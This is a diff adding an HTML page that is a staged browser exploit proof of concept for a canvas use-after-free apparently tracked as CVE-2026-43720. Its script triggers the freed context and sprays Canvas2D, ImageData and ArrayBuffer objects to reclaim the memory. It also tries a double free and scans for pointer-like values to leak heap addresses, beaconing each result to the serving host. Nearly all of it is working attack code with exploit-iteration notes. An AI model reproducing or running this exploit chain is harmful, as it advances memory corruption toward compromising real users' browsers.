@@ -1,0 +1,383 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635c</title></head>
+<body><pre id="out">p635c: Canvas UAF info leak — spray-first (no stale read)</pre>
+<script>
+'use strict';
+/*
+  p635c: CVE-2026-43720 info leak — spray before read
+  -- prior art: p635b crashed at Phase A (stale read before spray = SEGV)
+  -- prior art: p635v3 confirmed alias at spray[9], 48B+7prop R/W
+
+  CRASH_CLASS: HIGH — UAF reads on reclaimed heap memory
+
+  Strategy: SKIP pre-spray stale reads (they crash). Go straight to:
+  B) Trigger UAF, spray Canvas2D to reclaim, find alias, read for leaks
+  C) Same-type spray with unique patterns to identify alias index
+  D) ImageData cross-type reclaim — read Canvas2D fields over ImageData backing
+  E) Double free — alias, free alias canvas, spray ArrayBuffer, scan for markers
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635C-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635c', msg:msg, level:'info', sid:'p635c-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 1; cv.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return inner;
+}
+
+// Phase 0: confirm bitmaprenderer
+var tc = document.createElement('canvas');
+var bmr = tc.getContext('bitmaprenderer');
+if (!bmr) { bk('DEAD', 'no bitmaprenderer'); throw new Error('no bmr'); }
+bk('P0', 'bmr OK');
+tc = null; bmr = null;
+
+// ================================================================
+// PHASE B: Trigger UAF, spray Canvas2D to reclaim, find alias, read
+// ================================================================
+bk('B-START', 'spray-reclaim');
+var innerB = triggerUAF();
+if (!innerB) {
+  bk('B-FAIL', 'no inner');
+} else {
+  var sprayB = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayB.push(ctx);
+  }
+  bk('B-SPRAY', sprayB.length);
+
+  var SENT = 7331.25;
+  try { innerB.lineWidth = SENT; } catch(e) { bk('B-WRITE-CRASH', e.message.slice(0,40)); }
+  var aliasB = -1;
+  for (var i = 0; i < sprayB.length; i++) {
+    if (sprayB[i].lineWidth === SENT) { aliasB = i; break; }
+  }
+  bk('B-ALIAS', aliasB >= 0 ? 'spray[' + aliasB + ']' : 'NONE');
+
+  if (aliasB >= 0) {
+    var a = sprayB[aliasB];
+    var numProps = ['lineWidth','miterLimit','globalAlpha','shadowBlur',
+                    'shadowOffsetX','shadowOffsetY','lineDashOffset'];
+    var defaults = [1, 10, 1, 0, 0, 0, 0];
+    innerB.lineWidth = 1;
+    var leaks = [];
+    for (var i = 0; i < numProps.length; i++) {
+      try {
+        var val = a[numProps[i]];
+        if (val !== defaults[i]) {
+          leaks.push(numProps[i] + '=' + f64hex(val) + '(' + val + ')');
+        }
+      } catch(e) {}
+    }
+    bk('B-LEAKS', leaks.length > 0 ? leaks.join(' | ') : 'none (all defaults)');
+
+    try {
+      var txB = a.getTransform();
+      bk('B-TX', 'a=' + f64hex(txB.a) + ' b=' + f64hex(txB.b) +
+         ' c=' + f64hex(txB.c) + ' d=' + f64hex(txB.d) +
+         ' e=' + f64hex(txB.e) + ' f=' + f64hex(txB.f));
+      var txvB = [txB.a, txB.b, txB.c, txB.d, txB.e, txB.f];
+      for (var j = 0; j < txvB.length; j++) {
+        if (isPointerLike(txvB[j])) {
+          bk('B-PTR', 'tx[' + j + ']=' + f64hex(txvB[j]) + ' POINTER-LIKE');
+        }
+      }
+    } catch(e) {
+      bk('B-TX', 'ERR:' + e.message.slice(0,40));
+    }
+  }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: UAF + patterned spray — identify alias index
+// ================================================================
+bk('C-START', 'patterned spray');
+var innerC = triggerUAF();
+if (!innerC) {
+  bk('C-FAIL', 'no inner');
+} else {
+  var sprayC = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) {
+      ctx.setTransform(0.0001 * (i+1), 0, 0, 0.0001 * (i+1), 0, 0);
+      ctx.lineWidth = 10000 + i;
+      ctx.miterLimit = 20000 + i;
+      ctx.shadowBlur = 30000 + i;
+      sprayC.push(ctx);
+    }
+  }
+  bk('C-SPRAY', sprayC.length);
+
+  var readC = {};
+  try { readC.lw = innerC.lineWidth; } catch(e) { readC.lw = 'E'; }
+  try { readC.ml = innerC.miterLimit; } catch(e) { readC.ml = 'E'; }
+  try { readC.sb = innerC.shadowBlur; } catch(e) { readC.sb = 'E'; }
+  try { readC.ga = innerC.globalAlpha; } catch(e) { readC.ga = 'E'; }
+  bk('C-READ', JSON.stringify(readC));
+
+  var lwVal = readC.lw;
+  if (typeof lwVal === 'number' && lwVal >= 10000 && lwVal < 10200) {
+    bk('C-MATCH', 'alias=spray[' + (lwVal - 10000) + ']');
+  } else if (typeof lwVal === 'number' && lwVal !== 1) {
+    bk('C-STALE', 'lineWidth=' + f64hex(lwVal) + '(' + lwVal + ') NON-SPRAY');
+  } else {
+    bk('C-DEFAULT', 'lineWidth=' + lwVal);
+  }
+
+  try {
+    var txC = innerC.getTransform();
+    bk('C-TX', 'a=' + f64hex(txC.a) + '(' + txC.a + ') d=' + f64hex(txC.d) + '(' + txC.d + ')');
+    if (txC.a !== 1 && txC.a !== 0) {
+      var txIdx = Math.round(txC.a / 0.0001) - 1;
+      if (txIdx >= 0 && txIdx < 200) {
+        bk('C-TX-MATCH', 'alias=spray[' + txIdx + ']');
+      } else {
+        bk('C-TX-STALE', 'a=' + f64hex(txC.a) + ' NON-SPRAY');
+      }
+    }
+  } catch(e) {
+    bk('C-TX', 'ERR:' + e.message.slice(0,40));
+  }
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: ImageData cross-type reclaim
+// ================================================================
+bk('D-START', 'ImageData cross-type');
+var innerD = triggerUAF();
+if (!innerD) {
+  bk('D-FAIL', 'no inner');
+} else {
+  var imgDatas = [];
+  for (var i = 0; i < 300; i++) {
+    try {
+      var id = new ImageData(192, 1);
+      for (var j = 0; j < id.data.length; j++) {
+        id.data[j] = (i + j) & 0xFF;
+      }
+      imgDatas.push(id);
+    } catch(e) { break; }
+  }
+  bk('D-SPRAY', imgDatas.length + ' ImageData(192,1)');
+
+  var readD = {};
+  try { readD.lw = innerD.lineWidth; } catch(e) { readD.lw = 'CRASH:' + e.message.slice(0,30); }
+  try { readD.ml = innerD.miterLimit; } catch(e) { readD.ml = 'CRASH:' + e.message.slice(0,30); }
+  try { readD.ga = innerD.globalAlpha; } catch(e) { readD.ga = 'CRASH:' + e.message.slice(0,30); }
+  bk('D-READ', JSON.stringify(readD));
+
+  if (typeof readD.lw === 'number') {
+    bk('D-HEX', 'lw=' + f64hex(readD.lw) + ' ml=' + f64hex(readD.ml) + ' ga=' + f64hex(readD.ga));
+    if (isPointerLike(readD.lw)) bk('D-PTR', 'lineWidth POINTER-LIKE');
+    if (isPointerLike(readD.ml)) bk('D-PTR', 'miterLimit POINTER-LIKE');
+  }
+
+  try {
+    var txD2 = innerD.getTransform();
+    bk('D-TX', 'a=' + f64hex(txD2.a) + ' b=' + f64hex(txD2.b) +
+       ' c=' + f64hex(txD2.c) + ' d=' + f64hex(txD2.d));
+    var txvD = [txD2.a, txD2.b, txD2.c, txD2.d, txD2.e, txD2.f];
+    for (var j = 0; j < txvD.length; j++) {
+      if (isPointerLike(txvD[j])) bk('D-PTR', 'tx[' + j + ']=' + f64hex(txvD[j]));
+    }
+  } catch(e) {
+    bk('D-TX', 'CRASH:' + e.message.slice(0,40));
+  }
+}
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: Double free to ArrayBuffer
+// ================================================================
+bk('E-START', 'double-free');
+var innerE = triggerUAF();
+if (!innerE) {
+  bk('E-FAIL', 'no inner');
+} else {
+  var sprayE = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayE.push({ctx: ctx, canvas: c});
+  }
+
+  var SENTE = 8888.5;
+  try { innerE.lineWidth = SENTE; } catch(e) {}
+  var aliasE = -1;
+  for (var i = 0; i < sprayE.length; i++) {
+    if (sprayE[i].ctx.lineWidth === SENTE) { aliasE = i; break; }
+  }
+  bk('E-ALIAS', aliasE >= 0 ? 'spray[' + aliasE + ']' : 'NONE');
+
+  if (aliasE >= 0) {
+    innerE.setTransform(0xDEAD, 0xBEEF, 0xCAFE, 0xBABE, 0xF00D, 0xFACE);
+    innerE.lineWidth = 0x41414141;
+    innerE.miterLimit = 0x42424242;
+
+    var aliasCanvas = sprayE[aliasE].canvas;
+    sprayE[aliasE].canvas = null;
+    sprayE[aliasE].ctx = null;
+    if (aliasCanvas.parentNode) aliasCanvas.parentNode.removeChild(aliasCanvas);
+    aliasCanvas.width = 0;
+    aliasCanvas = null;
+
+    for (var gc = 0; gc < 100; gc++) {
+      try { new ArrayBuffer(65536); } catch(e) { break; }
+    }
+
+    var abSpray = [];
+    for (var i = 0; i < 500; i++) {
+      abSpray.push(new ArrayBuffer(768));
+    }
+    bk('E-AB-SPRAY', abSpray.length);
+
+    var found = false;
+    for (var i = 0; i < abSpray.length; i++) {
+      var view = new Float64Array(abSpray[i]);
+      for (var j = 0; j < view.length; j++) {
+        if (view[j] === 0xDEAD || view[j] === 0x41414141 || view[j] === 0x42424242) {
+          bk('E-RECLAIM', 'AB[' + i + '][' + j + ']=' + f64hex(view[j]) + ' MARKER');
+          found = true;
+          var dump = [];
+          for (var k = 0; k < Math.min(view.length, 12); k++) dump.push('[' + k + ']=' + f64hex(view[k]));
+          bk('E-DUMP', dump.join(' '));
+          break;
+        }
+        if (isPointerLike(view[j]) && !found) {
+          bk('E-PTR', 'AB[' + i + '][' + j + ']=' + f64hex(view[j]) + ' POINTER-LIKE');
+          found = true;
+          var dump2 = [];
+          for (var k = 0; k < Math.min(view.length, 12); k++) dump2.push('[' + k + ']=' + f64hex(view[k]));
+          bk('E-FULL', dump2.join(' '));
+          break;
+        }
+      }
+      if (found) break;
+    }
+    if (!found) {
+      bk('E-RESULT', 'no markers/pointers in ABs');
+      try {
+        bk('E-STILL-ALIVE', 'innerE.lw=' + innerE.lineWidth);
+      } catch(e) {
+        bk('E-FREED', 'innerE crashed');
+      }
+    }
+  }
+}
+bk('E-DONE', 'survived');
+
+// ================================================================
+// PHASE F: Offset mapping — write unique values through alias, read back through inner
+// ================================================================
+bk('F-START', 'offset mapping');
+var innerF = triggerUAF();
+if (!innerF) {
+  bk('F-FAIL', 'no inner');
+} else {
+  var sprayF = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayF.push(ctx);
+  }
+  var SENTF = 4242.75;
+  try { innerF.lineWidth = SENTF; } catch(e) {}
+  var aliasF = -1;
+  for (var i = 0; i < sprayF.length; i++) {
+    if (sprayF[i].lineWidth === SENTF) { aliasF = i; break; }
+  }
+
+  if (aliasF >= 0) {
+    var af = sprayF[aliasF];
+    af.setTransform(1.0000001, 2.0000002, 3.0000003, 4.0000004, 5.0000005, 6.0000006);
+    af.lineWidth = 11.11;
+    af.miterLimit = 22.22;
+    af.globalAlpha = 0.3333;
+    af.shadowBlur = 44.44;
+    af.shadowOffsetX = 55.55;
+    af.shadowOffsetY = 66.66;
+    af.lineDashOffset = 77.77;
+
+    var map = [];
+    try { map.push('lw:' + (innerF.lineWidth === 11.11)); } catch(e) { map.push('lw:E'); }
+    try { map.push('ml:' + (innerF.miterLimit === 22.22)); } catch(e) { map.push('ml:E'); }
+    try { map.push('ga:' + (innerF.globalAlpha === 0.3333)); } catch(e) { map.push('ga:E'); }
+    try { map.push('sb:' + (innerF.shadowBlur === 44.44)); } catch(e) { map.push('sb:E'); }
+    try { map.push('sox:' + (innerF.shadowOffsetX === 55.55)); } catch(e) { map.push('sox:E'); }
+    try { map.push('soy:' + (innerF.shadowOffsetY === 66.66)); } catch(e) { map.push('soy:E'); }
+    try { map.push('ldo:' + (innerF.lineDashOffset === 77.77)); } catch(e) { map.push('ldo:E'); }
+    try {
+      var txF = innerF.getTransform();
+      map.push('tx:a=' + (txF.a === 1.0000001) + ' d=' + (txF.d === 4.0000004));
+    } catch(e) { map.push('tx:E'); }
+    bk('F-MAP', map.join(' '));
+    bk('F-ALIAS', 'spray[' + aliasF + ']');
+
+    try {
+      af.fillStyle = '#aabbcc';
+      bk('F-FS', 'inner.fillStyle=' + innerF.fillStyle);
+    } catch(e) { bk('F-FS', 'ERR:' + e.message.slice(0,30)); }
+
+    try {
+      af.font = '12px serif';
+      bk('F-FONT', 'inner.font=' + innerF.font);
+    } catch(e) { bk('F-FONT', 'ERR:' + e.message.slice(0,30)); }
+  } else {
+    bk('F-ALIAS', 'NONE');
+  }
+}
+bk('F-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
